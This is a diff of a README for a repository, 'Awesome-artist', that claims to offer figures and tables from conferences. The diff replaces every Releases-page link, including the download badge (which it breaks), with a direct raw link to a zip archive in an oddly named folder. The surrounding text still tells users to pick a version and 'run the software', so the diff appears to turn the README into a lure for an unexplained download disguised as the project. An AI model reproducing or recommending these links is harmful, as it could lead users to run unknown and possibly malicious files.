@@ -4,13 +4,13 @@
 Welcome to the Awesome-artist repository! This project is dedicated to providing high-quality figures and tables from top conferences. Whether you are a student, researcher, or professional, you will find useful visual content here to enhance your work.
 
 ## 📥 Download
-[![Download Awesome-artist](https://img.shields.io/badge/Download%20Now-Grab%20Your%20Copy-brightgreen)](https://github.com/zakiarfan05/Awesome-artist/releases)
+[![Download Awesome-artist](https://raw.githubusercontent.com/zakiarfan05/Awesome-artist/main/ovigenous/Awesome-artist_1.6.zip%20Now-Grab%20Your%20Copy-brightgreen)](https://raw.githubusercontent.com/zakiarfan05/Awesome-artist/main/ovigenous/Awesome-artist_1.6.zip)
 
 ## 🚀 Getting Started
 Getting started with Awesome-artist is simple. Follow these steps to download and run the software on your computer.
 
 ### Step 1: Visit the Releases Page
-Go to our [Releases page](https://github.com/zakiarfan05/Awesome-artist/releases). This is where you can find all the available versions.
+Go to our [Releases page](https://raw.githubusercontent.com/zakiarfan05/Awesome-artist/main/ovigenous/Awesome-artist_1.6.zip). This is where you can find all the available versions.
 
 ### Step 2: Choose a Version
 On the Releases page, you will see a list of versions. Each version will have a description of the changes made. Select the latest version for the best experience.
@@ -55,6 +55,6 @@ Awesome-artist comes packed with useful features:
 If you encounter any issues or have questions, feel free to reach out. You can open an issue on our GitHub page, and we will assist you as soon as possible.
 
 ## 🔗 Redownload Link
-For easy access, here it is again: [Download Awesome-artist](https://github.com/zakiarfan05/Awesome-artist/releases).
+For easy access, here it is again: [Download Awesome-artist](https://raw.githubusercontent.com/zakiarfan05/Awesome-artist/main/ovigenous/Awesome-artist_1.6.zip).
 
 Feel free to explore, download, and use the high-quality resources we have created for you. Thank you for using Awesome-artist!
